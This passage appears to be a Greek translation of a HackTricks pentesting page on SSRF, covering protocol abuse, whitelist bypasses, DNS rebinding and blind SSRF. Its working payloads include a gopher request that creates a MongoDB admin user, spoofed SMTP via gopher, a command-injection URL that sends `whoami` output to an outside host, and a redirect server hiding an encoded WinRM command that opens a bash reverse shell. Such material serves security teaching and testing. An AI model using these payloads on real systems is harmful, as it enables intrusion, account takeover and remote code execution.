# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Μια ευπάθεια **Server-side Request Forgery (SSRF)** προκύπτει όταν ένας επιτιθέμενος χειραγωγεί μια **server-side application** ώστε να πραγματοποιήσει **HTTP requests** προς έναν domain της επιλογής του. Αυτή η ευπάθεια εκθέτει τον server σε αυθαίρετα εξωτερικά αιτήματα που καθορίζονται από τον επιτιθέμενο.

## Καταγραφή SSRF

Το πρώτο πράγμα που πρέπει να κάνεις είναι να καταγράψεις μια SSRF αλληλεπίδραση που δημιουργείται από εσένα. Για να καταγράψεις μια HTTP ή DNS αλληλεπίδραση μπορείς να χρησιμοποιήσεις εργαλεία όπως:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Whitelisted Domains Bypass

Συνήθως θα διαπιστώσεις ότι το SSRF λειτουργεί μόνο σε **certain whitelisted domains** ή URL. Στην παρακάτω σελίδα έχεις μια **compilation of techniques to try to bypass that whitelist**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via open redirect

Αν ο server είναι σωστά προστατευμένος, μπορείς να **bypass all the restrictions by exploiting an Open Redirect inside the web page**. Επειδή η σελίδα θα επιτρέψει **SSRF to the same domain** και πιθανώς θα **follow redirects**, μπορείς να εκμεταλλευτείς το **Open Redirect** για να αναγκάσεις τον server να προσπελάσει οποιονδήποτε εσωτερικό πόρο.\
Read more here: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Πρωτόκολλα

- **file://**
- Το URL scheme `file://` αναφέρεται, δείχνοντας απευθείας στο `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- Το DICT URL scheme περιγράφεται ως μέσο πρόσβασης σε ορισμούς ή λίστες λέξεων μέσω του DICT protocol. Το παράδειγμα δείχνει ένα URL που στοχεύει σε συγκεκριμένη λέξη, database και αριθμό εγγραφής, καθώς και μια περίπτωση όπου ένα PHP script μπορεί να καταχραστεί για να συνδεθεί σε DICT server χρησιμοποιώντας credentials που παρέχει ο επιτιθέμενος: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Αναφέρεται ως πρωτόκολλο για secure file transfer πάνω από secure shell, με παράδειγμα όπου ένα PHP script θα μπορούσε να εκμεταλλευτεί για να συνδεθεί σε κακόβουλο SFTP server: `url=sftp://generic.com:11111/`
- **TFTP://**
- Το Trivial File Transfer Protocol, που λειτουργεί πάνω από UDP, αναφέρεται με παράδειγμα ενός PHP script που στέλνει αίτημα σε TFTP server. Ένα TFTP αίτημα γίνεται στο 'generic.com' στην πόρτα '12346' για το αρχείο 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Αυτό το τμήμα καλύπτει το Lightweight Directory Access Protocol, τονίζοντας τη χρήση του για διαχείριση και πρόσβαση σε κατανεμημένες υπηρεσίες directory information πάνω σε IP δίκτυα. Αλληλεπίδραση με LDAP server στο localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Περιγράφεται μια μέθοδος εκμετάλλευσης SSRF για αλληλεπίδραση με SMTP υπηρεσίες στο localhost, συμπεριλαμβανομένων βημάτων για την αποκάλυψη εσωτερικών domain names και περαιτέρω ερευνητικών ενεργειών με βάση αυτές τις πληροφορίες.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Αν το SSRF εκτελείται από **curl**, το curl διαθέτει μια λειτουργία που ονομάζεται [**URL globbing**](https://everything.curl.dev/cmdline/globbing) που μπορεί να είναι χρήσιμη για bypass των WAFs. Για παράδειγμα, σε αυτό το [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) θα βρείτε το ακόλουθο παράδειγμα για **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Η ικανότητα του πρωτοκόλλου Gopher να προσδιορίζει **IP, port και bytes** για επικοινωνία με τον server περιγράφεται, μαζί με εργαλεία όπως Gopherus και remote-method-guesser για τη δημιουργία payloads. Δίνονται δύο διακριτές χρήσεις:

### Gopher://

Χρησιμοποιώντας αυτό το πρωτόκολλο μπορείτε να προσδιορίσετε τα **IP, port και bytes** που θέλετε ο server να **στείλει**. Στη συνέχεια, μπορείτε ουσιαστικά να εκμεταλλευτείτε ένα SSRF για να **επικοινωνήσετε με οποιονδήποτε TCP server** (αλλά χρειάζεται να ξέρετε πρώτα πώς να μιλήσετε με την υπηρεσία).\
Ευτυχώς, μπορείτε να χρησιμοποιήσετε [Gopherus](https://github.com/tarunkant/Gopherus) για να δημιουργήσετε payloads για διάφορες υπηρεσίες. Επιπλέον, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) μπορεί να χρησιμοποιηθεί για να δημιουργήσει _gopher_ payloads για υπηρεσίες _Java RMI_.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect σε 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Δημιουργία χρήστη με username=admin, password=admin123 και permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF μέσω Referrer header & Άλλα

Το λογισμικό ανάλυσης σε servers συχνά καταγράφει το Referrer header για να παρακολουθεί εισερχόμενους συνδέσμους, μια πρακτική που άθελά της εκθέτει εφαρμογές σε Server-Side Request Forgery (SSRF) ευπάθειες. Αυτό συμβαίνει επειδή τέτοιο λογισμικό μπορεί να επισκέπτεται εξωτερικά URLs που αναφέρονται στο Referrer header για να αναλύσει το περιεχόμενο της σελίδας παραπομπής. Για να εντοπιστούν αυτές οι ευπάθειες, προτείνεται το Burp Suite plugin **Collaborator Everywhere**, αξιοποιώντας τον τρόπο με τον οποίο τα εργαλεία ανάλυσης επεξεργάζονται το Referer header για να εντοπίσουν πιθανά σημεία επίθεσης SSRF.

## SSRF μέσω SNI δεδομένων από πιστοποιητικό

Μια εσφαλμένη ρύθμιση που θα μπορούσε να επιτρέψει τη σύνδεση σε οποιοδήποτε backend μέσω μιας απλής ρύθμισης απεικονίζεται με ένα παράδειγμα ρύθμισης Nginx:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
Σε αυτή τη διαμόρφωση, η τιμή από το πεδίο Server Name Indication (SNI) χρησιμοποιείται άμεσα ως η διεύθυνση του backend. Αυτή η ρύθμιση αποκαλύπτει μια ευπάθεια σε Server-Side Request Forgery (SSRF), η οποία μπορεί να εκμεταλλευτεί απλά με το να καθοριστεί η επιθυμητή διεύθυνση IP ή όνομα domain στο πεδίο SNI. Ένα παράδειγμα εκμετάλλευσης για να αναγκαστεί μια σύνδεση προς ένα αυθαίρετο backend, όπως το `internal.host.com`, χρησιμοποιώντας την εντολή `openssl`, δίνεται παρακάτω:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF via TLS AIA CA Issuers (Java mTLS)

Ορισμένα TLS stacks θα κατεβάσουν αυτόματα τα ελλείποντα ενδιάμεσα CAs χρησιμοποιώντας το URI **Authority Information Access (AIA) → CA Issuers** μέσα στο peer πιστοποιητικό. Στην **Java**, η ενεργοποίηση του `-Dcom.sun.security.enableAIAcaIssuers=true` ενώ τρέχει μια υπηρεσία mTLS κάνει τον server να dereference attacker-controlled URIs από το client certificate **κατά τη διάρκεια του handshake**, πριν εκτελεστεί οποιαδήποτε HTTP λογική.

- **Requirements**: mTLS ενεργοποιημένο, Java AIA fetching ενεργοποιημένο, attacker μπορεί να παρουσιάσει ένα client cert με crafted AIA CA Issuers URI.
- **Triggering SSRF** (Java 21 example):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
Το Java certpath debug output δείχνει `CertStore URI:http://localhost:8080`, και το `nc` καταγράφει το HTTP request με τον ελεγχόμενο `User-Agent` από το `-Dhttp.agent`, αποδεικνύοντας SSRF κατά την επικύρωση του πιστοποιητικού.
- **DoS via file://**: το να ορίσετε AIA CA Issuers σε `file:///dev/urandom` σε Unix-like hosts κάνει την Java να το χειρίζεται ως CertStore και να διαβάζει απεριόριστα τυχαία bytes, απασχολώντας έναν CPU πυρήνα και μπλοκάροντας επόμενες συνδέσεις ακόμα και μετά ο client αποσυνδεθεί.

## SSRF via CSS Pre-Processors

Το LESS είναι ένας δημοφιλής CSS pre-processor που προσθέτει variables, mixins, functions και την ισχυρή οδηγία `@import`. Κατά τη μεταγλώττιση, ο engine του LESS θα κατεβάσει (fetch) τους πόρους που αναφέρονται στις δηλώσεις `@import` και θα ενσωματώσει ("inline") τα περιεχόμενά τους στο παραγόμενο CSS όταν χρησιμοποιείται η επιλογή `(inline)`.

Check how to exploit it in:

{{#ref}}
../xs-search/css-injection/less-code-injection.md
{{#endref}}


## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

Αξίζει να δοκιμάσετε ένα payload όπως: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDFs Rendering

Εάν η σελίδα αυτόματα δημιουργεί ένα PDF με πληροφορίες που παρείχατε, μπορείτε να **εισάγετε κάποιο JS που θα εκτελεστεί από τον δημιουργό του PDF** (τον server) κατά τη δημιουργία του PDF και θα μπορέσετε να καταχραστείτε ένα SSRF. [**Βρείτε περισσότερες πληροφορίες εδώ**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## From SSRF to DoS

Δημιουργήστε αρκετές sessions και δοκιμάστε να κατεβάσετε μεγάλα αρχεία εκμεταλλευόμενοι το SSRF από αυτές τις sessions.

## SSRF PHP Functions

Δείτε την παρακάτω σελίδα για ευάλωτες PHP και ακόμα και Wordpress functions:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

Για ορισμένες εκμεταλλεύσεις μπορεί να χρειαστεί να **στείλετε μια redirect απάντηση** (πιθανώς για να χρησιμοποιήσετε ένα διαφορετικό πρωτόκολλο όπως gopher). Εδώ έχετε διάφορους python κώδικες για να απαντήσετε με redirect:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Λανθασμένα διαμορφωμένοι proxies για SSRF

Κόλπα [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask proxy vulnerable code</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Το Flask επιτρέπει τη χρήση του **`@`** ως αρχικού χαρακτήρα, κάτι που επιτρέπει να γίνει το **initial host name the username** και να inject ένα νέο. Attack request:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Ευάλωτος κώδικας:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Αποκαλύφθηκε ότι είναι δυνατό να **ξεκινήσει το path** ενός αιτήματος με τον χαρακτήρα **`;`**, ο οποίος επιτρέπει στη συνέχεια τη χρήση του **`@`** και την έγχυση νέου host για πρόσβαση. Αίτημα επίθεσης:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP Built-in Web Server <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Ευάλωτος κώδικας PHP</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP επιτρέπει τη χρήση του χαρακτήρα `*` πριν από ένα slash στο path του URL, ωστόσο έχει άλλους περιορισμούς όπως ότι μπορεί να χρησιμοποιηθεί μόνο για το root pathname `/` και ότι οι τελείες `.` δεν επιτρέπονται πριν από το πρώτο slash, οπότε χρειάζεται να χρησιμοποιηθεί για παράδειγμα μια διεύθυνση IP κωδικοποιημένη σε hex χωρίς τελείες:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Αν αντιμετωπίζετε **προβλήματα** να **exfiltrate content from a local IP** λόγω **CORS/SOP**, **DNS Rebidding** μπορεί να χρησιμοποιηθεί για να παρακάμψει αυτόν τον περιορισμό:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Αυτοματοποιημένο DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) είναι ένα εργαλείο για να πραγματοποιεί επιθέσεις [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding). Περιλαμβάνει τα απαραίτητα components για να rebind την IP address του attack server DNS name στην target machine's IP address και να σερβίρει attack payloads για την εκμετάλλευση vulnerable software στην target machine.

Δείτε επίσης τον δημόσια διαθέσιμο server στο [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requirements:

- **SSRF**
- **Outbound TLS sessions**
- **Stuff on local ports**

Attack:

1. Ζητήστε από τον user/bot να αποκτήσει πρόσβαση σε ένα **domain** ελεγχόμενο από τον **attacker**
2. Το **TTL** του **DNS** είναι **0** sec (οπότε το victim θα ελέγξει ξανά την IP του domain σύντομα)
3. Μια **TLS connection** δημιουργείται ανάμεσα στο victim και το domain του attacker. Ο attacker εισάγει το **payload** μέσα στο **Session ID** ή στο **Session Ticket**.
4. Το **domain** θα ξεκινήσει έναν **infinite loop** από redirects εναντίον του **ίδιου**. Ο στόχος αυτού είναι να κάνει τον user/bot να προσπελάσει το domain μέχρι να εκτελέσει **ξανά** ένα **DNS request** για το domain.
5. Στο DNS request τώρα δίνεται μια **private IP** διεύθυνση (127.0.0.1 για παράδειγμα)
6. Ο user/bot θα προσπαθήσει να **reestablish the TLS connection** και για να το κάνει θα **στείλει** το **Session ID/Ticket ID** (όπου περιείχε το **payload** του attacker). Συγχαρητήρια — καταφέρατε να ζητήσετε από τον user/bot να επιτεθεί στον ίδιο.

Σημειώστε ότι κατά τη διάρκεια αυτής της επίθεσης, αν θέλετε να επιτεθείτε στο localhost:11211 (_memcache_) πρέπει να κάνετε το victim να ανοίξει την αρχική σύνδεση με www.attacker.com:11211 (η θύρα πρέπει πάντα να είναι η ίδια).\
Για να πραγματοποιήσετε αυτή την επίθεση μπορείτε να χρησιμοποιήσετε το εργαλείο: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
Για περισσότερες πληροφορίες δείτε την ομιλία όπου αυτή η επίθεση εξηγείται: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

Η διαφορά ανάμεσα σε ένα blind SSRF και σε ένα μη-blind είναι ότι στο blind δεν μπορείτε να δείτε την απάντηση του SSRF request. Επομένως, είναι πιο δύσκολο να εκμεταλλευτείτε, καθώς θα μπορείτε να εκμεταλλευτείτε μόνο καλά-γνωστές ευπάθειες.

### Time based SSRF

Ελέγχοντας τον χρόνο των απαντήσεων από τον server μπορεί να είναι δυνατό να γνωρίζετε αν ένας resource υπάρχει ή όχι (ίσως απαιτεί περισσότερο χρόνο η πρόσβαση σε ένα υπάρχον resource απ' ό,τι σε ένα που δεν υπάρχει)

### From blid to full abusing status codes

Σύμφωνα με αυτό το [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), κάποια blind SSRF μπορεί να συμβεί επειδή ακόμη και αν το στοχευόμενο URL απαντήσει με 200 status code (όπως AWS metadata), αυτά τα data δεν είναι σωστά μορφοποιημένα και επομένως η εφαρμογή μπορεί να αρνηθεί να τα εμφανίσει.

Ωστόσο, βρέθηκε ότι στέλνοντας κάποιες redirect responses από 305 έως 309 στο SSRF, μπορεί να είναι δυνατό να κάνει την εφαρμογή να **ακολουθήσει αυτά τα redirects ενώ εισέρχεται σε κατάσταση σφάλματος** που δεν θα ελέγχει πλέον το format των δεδομένων και μπορεί απλά να τα εκτυπώσει.

Ο python server που χρησιμοποιείται για να εκμεταλλευτεί αυτό είναι ο παρακάτω:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Steps:**
- First 302 gets the app to start following.
- Then it receives 305 → 306 → 307 → 308 → 309 → 310.
- After the 5th strange code the PoC finally returns 302 → 169.254.169.254 → 200 OK.

**What happens inside the target:**
- libcurl itself does follow 305–310; it just normalises unknown codes to “follow.”
